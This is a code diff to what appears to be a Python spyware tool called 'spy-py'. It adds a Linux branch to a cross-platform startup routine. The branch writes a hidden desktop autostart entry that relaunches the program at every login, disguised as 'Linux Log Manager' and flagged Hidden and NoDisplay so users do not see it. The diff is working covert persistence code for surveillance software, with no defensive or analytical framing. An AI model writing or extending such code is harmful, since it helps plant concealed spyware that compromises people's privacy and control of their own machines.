@@ -8,7 +8,6 @@ try:
     import plistlib
 except ImportError:
     pass
-
 try:
     import winreg
 except ImportError:
@@ -73,6 +72,25 @@ def add_to_startup():
         )
         with open(plist_path, "wb") as f:
             plistlib.dump(plist, f)
+    elif platform.system() == "Linux":
+        autostart_dir = os.path.expanduser("~/.config/autostart")
+        os.makedirs(autostart_dir, exist_ok=True)
+        autostart_file = os.path.join(autostart_dir, "spy-py.desktop")
+        with open(autostart_file, "w") as f:
+            f.write(
+                f"""
+        [Desktop Entry]
+        Type=Application
+        Exec={python_interpreter_path} {main_file_path}
+        Hidden=true
+        NoDisplay=true
+        X-GNOME-Autostart-enabled=true
+        Name[en_US]=Linux Log Manager
+        Name=Linux Log Manager
+        Comment[en_US]=
+        Comment=
+        """
+            )
 
 
 def install_requirements():
